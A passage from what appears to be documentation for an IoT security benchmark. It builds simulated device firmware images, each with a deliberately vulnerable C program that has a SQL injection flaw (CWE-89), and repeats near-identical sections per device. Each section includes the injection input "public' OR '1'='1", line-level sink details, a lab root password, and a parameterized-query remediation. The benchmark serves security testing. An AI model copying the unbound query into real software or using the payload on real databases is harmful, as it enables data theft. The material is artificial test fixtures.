`rootfs.manifest` and `validation-console.log`; aggregate build, parse, offline,
runtime and database-determinism logs are under
`deploy-images/c-sql-injection-qemuarm64-*`. Other supported architectures were
not built or boot-tested. No external static-analysis engine was run; CWE-89
is the expected ground truth supported by the installed C flow and reproduced
SQL behavior.

### C SQL Injection — doorlock

Simulated device: **access-control door lock**, reusing
`meta-iotbench/recipes-devices/doorlock/`. Firmware directory:
`deploy-images/doorlock-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-doorlock-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=doorlock-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=doorlock-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh doorlock
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/doorlock-cwe089-c-sql-injection/qemuarm64/iotbench-doorlock-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device doorlock
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/doorlock-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/doorlock-cwe089-c-sql-injection/qemuarm64/iotbench-doorlock-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — envsensor

Simulated device: **environmental sensor**, reusing
`meta-iotbench/recipes-devices/envsensor/`. Firmware directory:
`deploy-images/envsensor-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-envsensor-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=envsensor-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=envsensor-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh envsensor
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/envsensor-cwe089-c-sql-injection/qemuarm64/iotbench-envsensor-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device envsensor
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/envsensor-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/envsensor-cwe089-c-sql-injection/qemuarm64/iotbench-envsensor-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — healthmonitor

Simulated device: **health monitor**, reusing
`meta-iotbench/recipes-devices/healthmonitor/`. Firmware directory:
`deploy-images/healthmonitor-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-healthmonitor-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=healthmonitor-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=healthmonitor-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh healthmonitor
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/healthmonitor-cwe089-c-sql-injection/qemuarm64/iotbench-healthmonitor-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device healthmonitor
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/healthmonitor-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/healthmonitor-cwe089-c-sql-injection/qemuarm64/iotbench-healthmonitor-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — ipcamera

Simulated device: **surveillance IP camera**, reusing
`meta-iotbench/recipes-devices/ipcamera/`. Firmware directory:
`deploy-images/ipcamera-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-ipcamera-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=ipcamera-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=ipcamera-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh ipcamera
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/ipcamera-cwe089-c-sql-injection/qemuarm64/iotbench-ipcamera-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device ipcamera
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/ipcamera-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/ipcamera-cwe089-c-sql-injection/qemuarm64/iotbench-ipcamera-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — plc

Simulated device: **industrial PLC gateway (OT)**, reusing
`meta-iotbench/recipes-devices/plc/`. Firmware directory:
`deploy-images/plc-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-plc-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=plc-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=plc-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh plc
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/plc-cwe089-c-sql-injection/qemuarm64/iotbench-plc-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device plc
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/plc-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/plc-cwe089-c-sql-injection/qemuarm64/iotbench-plc-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — router

Simulated device: **network router / gateway**, reusing
`meta-iotbench/recipes-devices/router/`. Firmware directory:
`deploy-images/router-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-router-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=router-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=router-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh router
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/router-cwe089-c-sql-injection/qemuarm64/iotbench-router-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device router
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/router-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/router-cwe089-c-sql-injection/qemuarm64/iotbench-router-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — smartbulb

Simulated device: **lighting / smart bulb**, reusing
`meta-iotbench/recipes-devices/smartbulb/`. Firmware directory:
`deploy-images/smartbulb-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartbulb-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartbulb-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=smartbulb-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh smartbulb
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartbulb-cwe089-c-sql-injection/qemuarm64/iotbench-smartbulb-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device smartbulb
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/smartbulb-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/smartbulb-cwe089-c-sql-injection/qemuarm64/iotbench-smartbulb-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — smarthub

Simulated device: **controller / smart hub**, reusing
`meta-iotbench/recipes-devices/smarthub/`. Firmware directory:
`deploy-images/smarthub-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smarthub-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smarthub-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=smarthub-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh smarthub
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smarthub-cwe089-c-sql-injection/qemuarm64/iotbench-smarthub-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
